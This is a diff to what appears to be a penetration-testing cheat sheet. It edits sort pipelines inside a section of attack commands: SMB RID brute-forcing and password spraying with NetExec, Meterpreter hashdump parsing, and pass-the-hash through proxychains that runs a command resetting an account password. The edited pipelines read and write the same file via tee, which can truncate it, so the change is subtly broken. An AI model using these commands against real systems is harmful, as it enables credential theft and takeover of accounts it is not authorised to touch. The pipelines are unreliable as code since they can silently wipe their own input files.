@@ -112,8 +112,8 @@ gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
 
 # Exploitation
 ## Sorting files
-sort -u usernames | tee usernames
-sort -u passwords | tee passwords
+cat usernames | sort -u | tee usernames
+cat passwords | sort -u | tee passwords
 
 ## Decompressing files
 tar -xzvf backup.tar.gz -C .
@@ -616,7 +616,7 @@ godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 
 +---------- Get Shares, Users and Groups ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; cat usernames | sort -u | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --groups | grep 'membercount' | cut -d':' -f1 | sed 's/^[^ ]* *[^ ]* *[^ ]* *[^ ]* *//' | sed 's/ *membercount.*//' >> groups
 
 +---------- Spider Share for Files ----------+
@@ -1257,8 +1257,8 @@ for /L %i in (1,1,254) do ping -n 1 192.168.1.%i
 [*] Pass The Hash
 meterpreter> hashdump
 DUMP=''
-echo "$DUMP" | cut -d ':' -f 1 >> usernames; sort -u usernames | tee usernames
-echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; sort -u hashes | tee hashes
+echo "$DUMP" | cut -d ':' -f 1 >> usernames; cat usernames | sort -u | tee usernames
+echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; cat hashes | sort -u | tee hashes
 
 +---------- Proxychains ----------+
 proxychains nxc smb 10.129.121.240 -u usernames -H hashes -x 'net user sysadm 123qweasdF!'
